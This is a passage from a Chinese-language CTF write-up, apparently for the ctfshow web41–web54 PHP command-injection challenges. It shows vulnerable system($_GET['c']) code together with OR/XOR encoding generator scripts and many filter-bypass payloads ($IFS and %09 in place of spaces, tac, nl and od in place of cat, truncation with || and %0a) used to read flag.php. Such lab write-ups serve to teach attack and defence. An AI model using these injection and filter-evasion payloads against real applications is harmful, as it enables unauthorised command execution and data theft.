<span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$hex_i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$preg</span> <span class="token punctuation">,</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$hex_j</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token keyword">echo</span> <span class="token string">""</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                    <span class="token variable">$par1</span> <span class="token operator">=</span> <span class="token string">"%"</span><span class="token punctuation">.</span><span class="token variable">$hex_i</span><span class="token punctuation">;</span>                    <span class="token variable">$par2</span> <span class="token operator">=</span> <span class="token string">'%'</span><span class="token punctuation">.</span><span class="token variable">$hex_j</span><span class="token punctuation">;</span>                    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$mode</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">orRce</span><span class="token punctuation">(</span><span class="token variable">$par1</span><span class="token punctuation">,</span> <span class="token variable">$par2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$mode</span><span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">xorRce</span><span class="token punctuation">(</span><span class="token variable">$par1</span><span class="token punctuation">,</span> <span class="token variable">$par2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token operator">>=</span><span class="token number">32</span><span class="token operator">&amp;</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">126</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                        <span class="token variable">$contents</span><span class="token operator">=</span><span class="token variable">$contents</span><span class="token punctuation">.</span><span class="token variable">$res</span><span class="token punctuation">.</span><span class="token string">" "</span><span class="token punctuation">.</span><span class="token variable">$par1</span><span class="token punctuation">.</span><span class="token string">" "</span><span class="token punctuation">.</span><span class="token variable">$par2</span><span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">,</span><span class="token variable">$contents</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">negateRce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token function">generate</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">'/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&amp;|\-/i'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç»“åˆç¾½å¸ˆå‚…çš„pythonçš„è„šæœ¬ï¼š</p><p><strong>æˆ–ï¼š</strong></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> urllib<span class="token keyword">from</span> sys <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> os<span class="token keyword">def</span> <span class="token function">action</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span><span class="token punctuation">:</span>   s1<span class="token operator">=</span><span class="token string">""</span>   s2<span class="token operator">=</span><span class="token string">""</span>   <span class="token keyword">for</span> i <span class="token keyword">in</span> arg<span class="token punctuation">:</span>       f<span class="token operator">=</span>open<span class="token punctuation">(</span><span class="token string">"or_rce.txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span>       <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>           t<span class="token operator">=</span>f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span>           <span class="token keyword">if</span> t<span class="token operator">==</span><span class="token string">""</span><span class="token punctuation">:</span>               <span class="token keyword">break</span>           <span class="token keyword">if</span> t<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span>i<span class="token punctuation">:</span>               <span class="token comment" spellcheck="true">#print(i)</span>               s1<span class="token operator">+=</span>t<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span>               s2<span class="token operator">+=</span>t<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>               <span class="token keyword">break</span>       f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>   output<span class="token operator">=</span><span class="token string">"(\""</span><span class="token operator">+</span>s1<span class="token operator">+</span><span class="token string">"\"|\""</span><span class="token operator">+</span>s2<span class="token operator">+</span><span class="token string">"\")"</span>   <span class="token keyword">return</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>   param<span class="token operator">=</span>action<span class="token punctuation">(</span>input<span class="token punctuation">(</span><span class="token string">"\n[+] your functionï¼š"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token operator">+</span>action<span class="token punctuation">(</span>input<span class="token punctuation">(</span><span class="token string">"[+] your commandï¼š"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">";"</span>   <span class="token keyword">print</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>å¼‚æˆ–ï¼š</strong></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> urllib<span class="token keyword">from</span> sys <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> os<span class="token keyword">def</span> <span class="token function">action</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span><span class="token punctuation">:</span>   s1<span class="token operator">=</span><span class="token string">""</span>   s2<span class="token operator">=</span><span class="token string">""</span>   <span class="token keyword">for</span> i <span class="token keyword">in</span> arg<span class="token punctuation">:</span>       f<span class="token operator">=</span>open<span class="token punctuation">(</span><span class="token string">"xor_rce.txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span>       <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>           t<span class="token operator">=</span>f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span>           <span class="token keyword">if</span> t<span class="token operator">==</span><span class="token string">""</span><span class="token punctuation">:</span>               <span class="token keyword">break</span>           <span class="token keyword">if</span> t<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span>i<span class="token punctuation">:</span>               <span class="token comment" spellcheck="true">#print(i)</span>               s1<span class="token operator">+=</span>t<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span>               s2<span class="token operator">+=</span>t<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>               <span class="token keyword">break</span>       f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>   output<span class="token operator">=</span><span class="token string">"(\""</span><span class="token operator">+</span>s1<span class="token operator">+</span><span class="token string">"\"^\""</span><span class="token operator">+</span>s2<span class="token operator">+</span><span class="token string">"\")"</span>   <span class="token keyword">return</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>   param<span class="token operator">=</span>action<span class="token punctuation">(</span>input<span class="token punctuation">(</span><span class="token string">"\n[+] your functionï¼š"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token operator">+</span>action<span class="token punctuation">(</span>input<span class="token punctuation">(</span><span class="token string">"[+] your commandï¼š"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">";"</span>   <span class="token keyword">print</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="payloadï¼š-5"><a href="#payloadï¼š-5" class="headerlink" title="payloadï¼š"></a>payloadï¼š</h3><pre class="line-numbers language-php"><code class="language-php">c<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token string">"%13%19%13%14%05%0d"</span><span class="token operator">|</span><span class="token string">"%60%60%60%60%60%60"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">"%0c%13"</span><span class="token operator">|</span><span class="token string">"%60%60"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment">#</span>c<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token string">"%13%19%13%14%05%0d"</span><span class="token operator">|</span><span class="token string">"%60%60%60%60%60%60"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">"%03%01%14%00%06%0c%01%07%00%10%08%10"</span><span class="token operator">|</span><span class="token string">"%60%60%60%20%60%60%60%60%2e%60%60%60"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment">#</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"echo("</span><span class="token string">");system('cat flag.php');#"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B406%E6%9C%8823%E6%97%A51607_1.png" alt></p><h2 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">.</span><span class="token string">" >/dev/null 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>1ï¼š&gt; ä»£è¡¨é‡å®šå‘åˆ°å“ªé‡Œï¼Œä¾‹å¦‚ï¼šecho â€œ123â€ &gt; /home/123.txt<br>2ï¼š/dev/null ä»£è¡¨ç©ºè®¾å¤‡æ–‡ä»¶<br>3ï¼š2&gt; è¡¨ç¤ºstderræ ‡å‡†é”™è¯¯<br>4ï¼š&amp; è¡¨ç¤ºç­‰åŒäºçš„æ„æ€ï¼Œ2&gt;&amp;1ï¼Œè¡¨ç¤º2çš„è¾“å‡ºé‡å®šå‘ç­‰åŒäº1<br>5ï¼š1 è¡¨ç¤ºstdoutæ ‡å‡†è¾“å‡ºï¼Œç³»ç»Ÿé»˜è®¤å€¼æ˜¯1ï¼Œæ‰€ä»¥â€&gt;/dev/nullâ€ç­‰åŒäº â€œ1&gt;/dev/nullâ€<br>å› æ­¤ï¼Œ&gt;/dev/null 2&gt;&amp;1 ä¹Ÿå¯ä»¥å†™æˆâ€œ1&gt; /dev/null 2&gt; &amp;1â€</p><p>é‚£ä¹ˆæœ¬æ–‡æ ‡é¢˜çš„è¯­å¥æ‰§è¡Œè¿‡ç¨‹ä¸ºï¼š<br>1&gt;/dev/null ï¼šé¦–å…ˆè¡¨ç¤ºæ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ°ç©ºè®¾å¤‡æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯ä¸è¾“å‡ºä»»ä½•ä¿¡æ¯åˆ°ç»ˆç«¯ï¼Œä¹Ÿå°±æ˜¯ä¸æ˜¾ç¤ºä»»ä½•ä¿¡æ¯ã€‚<br>2&gt;&amp;1 ï¼š æ¥ç€ï¼Œæ ‡å‡†é”™è¯¯è¾“å‡ºé‡å®šå‘åˆ°æ ‡å‡†è¾“å‡ºï¼Œå› ä¸ºä¹‹å‰æ ‡å‡†è¾“å‡ºå·²ç»é‡å®šå‘åˆ°äº†ç©ºè®¾å¤‡æ–‡ä»¶ï¼Œæ‰€ä»¥æ ‡å‡†é”™è¯¯è¾“å‡ºä¹Ÿé‡å®šå‘åˆ°ç©ºè®¾å¤‡æ–‡ä»¶ã€‚</p><p>è¿™é‡Œæˆ‘å†æ¥è¿›è¡Œä¸€æ³¢è§£é‡Šï¼š<br>0è¡¨ç¤ºé”®ç›˜è¾“å…¥ï¼Œ1è¡¨ç¤ºå±å¹•è¾“å‡ºï¼Œ2è¡¨ç¤ºé”™è¯¯è¾“å‡ºï¼<br>â€˜ &gt; â€™ é»˜è®¤æ ‡å‡†è¾“å‡ºé‡å®šå‘ï¼Œä¸1&gt;ç›¸åŒ<br>2&gt;&amp;1 æ„æ€æ˜¯æŠŠæ ‡å‡†é”™è¯¯è¾“å‡ºé‡å®šå‘åˆ°æ ‡å‡†è¾“å‡º<br>&amp;&gt;file æ„æ€æ˜¯æŠŠæ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯è¾“å‡ºéƒ½é‡å®šå‘åˆ°æ–‡ä»¶fileä¸­</p><p>è€Œæˆ‘ä»¬æƒ³è¦å¾—åˆ°è¾“å‡ºï¼Œå°±ä¸èƒ½è®©åé¢çš„è¿›è¡Œæ‰§è¡Œï¼Œæ‰€ä»¥å¯ä»¥åŠ ä¸Šæˆªæ–­è¯­å¥</p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span>cat flag<span class="token punctuation">.</span>php<span class="token operator">||</span><span class="token operator">?</span>c<span class="token operator">=</span>cat flag<span class="token punctuation">.</span>php<span class="token operator">%</span><span class="token number">26</span><span class="token operator">?</span>c<span class="token operator">=</span>cat flag<span class="token punctuation">.</span>php<span class="token operator">%</span><span class="token number">26</span><span class="token operator">%</span><span class="token number">26</span><span class="token operator">?</span>c<span class="token operator">=</span>cat flag<span class="token punctuation">.</span>php<span class="token operator">%</span>0a<span class="token operator">?</span>c<span class="token operator">=</span>cat flag<span class="token punctuation">.</span>php<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/\;|cat|flag| |[0-9]|\\$|\*/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">.</span><span class="token string">" >/dev/null 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="payloadï¼š-6"><a href="#payloadï¼š-6" class="headerlink" title="payloadï¼š"></a>payloadï¼š</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span>tac<span class="token operator">%</span>09fla<span class="token operator">?</span><span class="token punctuation">.</span>php<span class="token operator">||</span><span class="token operator">?</span>c<span class="token operator">=</span>nl<span class="token operator">%</span>09fla<span class="token string">''</span>g<span class="token punctuation">.</span>php<span class="token operator">%</span>0a<span class="token operator">?</span>c<span class="token operator">=</span>more<span class="token operator">%</span>09fl\<span class="token package">ag</span><span class="token punctuation">.</span>php<span class="token operator">%</span><span class="token number">26</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="ç©ºæ ¼ç»•è¿‡"><a href="#ç©ºæ ¼ç»•è¿‡" class="headerlink" title="ç©ºæ ¼ç»•è¿‡"></a><strong>ç©ºæ ¼ç»•è¿‡</strong></h4><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">></span> <span class="token markup">&lt; &lt;></span> é‡å®šå‘ç¬¦<span class="token operator">%</span><span class="token function">09</span><span class="token punctuation">(</span>éœ€è¦phpç¯å¢ƒ<span class="token punctuation">)</span>$<span class="token punctuation">{</span><span class="token constant">IFS</span><span class="token punctuation">}</span><span class="token variable">$IFS</span><span class="token variable">$9</span><span class="token variable">$IFS</span>\<span class="token punctuation">{</span>cat<span class="token punctuation">,</span>flag<span class="token punctuation">.</span>php<span class="token punctuation">}</span> <span class="token comment" spellcheck="true">//ç”¨é€—å·å®ç°äº†ç©ºæ ¼åŠŸèƒ½</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">09</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web47"><a href="#web47" class="headerlink" title="web47"></a>web47</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">.</span><span class="token string">" >/dev/null 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="è¯»æ–‡ä»¶ç»•è¿‡-catç»•è¿‡"><a href="#è¯»æ–‡ä»¶ç»•è¿‡-catç»•è¿‡" class="headerlink" title="è¯»æ–‡ä»¶ç»•è¿‡(catç»•è¿‡)"></a><strong>è¯»æ–‡ä»¶ç»•è¿‡(catç»•è¿‡)</strong></h3><pre><code>é€‚ç”¨æ¡ä»¶:è¿‡æ»¤äº†cat1)more:ä¸€é¡µä¸€é¡µçš„æ˜¾ç¤ºæ¡£æ¡ˆå†…å®¹(2)less:ä¸ more ç±»ä¼¼ï¼Œä½†æ˜¯æ¯” more æ›´å¥½çš„æ˜¯ï¼Œä»–å¯ä»¥[pg dn][pg up]ç¿»é¡µ(3)head:æŸ¥çœ‹å¤´å‡ è¡Œ(4)tac:ä»æœ€åä¸€è¡Œå¼€å§‹æ˜¾ç¤ºï¼Œå¯ä»¥çœ‹å‡º tac æ˜¯ cat çš„åå‘æ˜¾ç¤º(5)tail:æŸ¥çœ‹å°¾å‡ è¡Œ(6)nlï¼šæ˜¾ç¤ºçš„æ—¶å€™ï¼Œé¡ºä¾¿è¾“å‡ºè¡Œå·(7)od:ä»¥äºŒè¿›åˆ¶çš„æ–¹å¼è¯»å–æ¡£æ¡ˆå†…å®¹(8)vi:ä¸€ç§ç¼–è¾‘å™¨ï¼Œè¿™ä¸ªä¹Ÿå¯ä»¥æŸ¥çœ‹(9)vim:ä¸€ç§ç¼–è¾‘å™¨ï¼Œè¿™ä¸ªä¹Ÿå¯ä»¥æŸ¥çœ‹(10)sort:å¯ä»¥æŸ¥çœ‹,å°†æ–‡ä»¶è¿›è¡Œæ’åºå¹¶è¾“å‡º(11)uniq:å¯ä»¥æŸ¥çœ‹ï¼ŒæŠ¥å‘Šæˆ–å¿½ç•¥æ–‡ä»¶ä¸­çš„é‡å¤è¡Œ(12)file -f:æŠ¥é”™å‡ºå…·ä½“å†…å®¹grep grep test *file   #åœ¨å½“å‰ç›®å½•ä¸­ï¼ŒæŸ¥æ‰¾åç¼€æœ‰ file å­—æ ·çš„æ–‡ä»¶ä¸­åŒ…å« test å­—ç¬¦ä¸²çš„æ–‡ä»¶ï¼Œå¹¶æ‰“å°å‡ºè¯¥å­—ç¬¦ä¸²çš„è¡Œ</code></pre><h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload:"></a>payload:</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span>uniq<span class="token operator">%</span>09fla<span class="token operator">?</span><span class="token punctuation">.</span>php<span class="token operator">%</span><span class="token number">26</span><span class="token operator">?</span>c<span class="token operator">=</span>od<span class="token operator">%</span>09fl\<span class="token package">ag</span><span class="token punctuation">.</span>php<span class="token operator">%</span><span class="token number">26</span><span class="token operator">%</span><span class="token number">26</span><span class="token operator">?</span>c<span class="token operator">=</span>vi<span class="token operator">%</span>09fl\<span class="token package">ag</span><span class="token punctuation">.</span>php<span class="token operator">%</span><span class="token number">26</span><span class="token operator">%</span><span class="token number">26</span><span class="token operator">?</span>c<span class="token operator">=</span>tac<span class="token operator">%</span>09fl\<span class="token package">ag</span><span class="token punctuation">.</span>php<span class="token operator">||</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">.</span><span class="token string">" >/dev/null 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="payload-2"><a href="#payload-2" class="headerlink" title="payload:"></a>payload:</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span>nl<span class="token variable">$IFS</span>\<span class="token package">fla</span><span class="token operator">?</span><span class="token punctuation">.</span>php<span class="token operator">||</span><span class="token operator">?</span>c<span class="token operator">=</span>nl<span class="token variable">$IFS</span>\<span class="token package">fla<span class="token punctuation">\</span>g</span><span class="token punctuation">.</span>php<span class="token operator">||</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\>|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="payload-3"><a href="#payload-3" class="headerlink" title="payload:"></a>payload:</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span>vi<span class="token variable">$IFS</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span 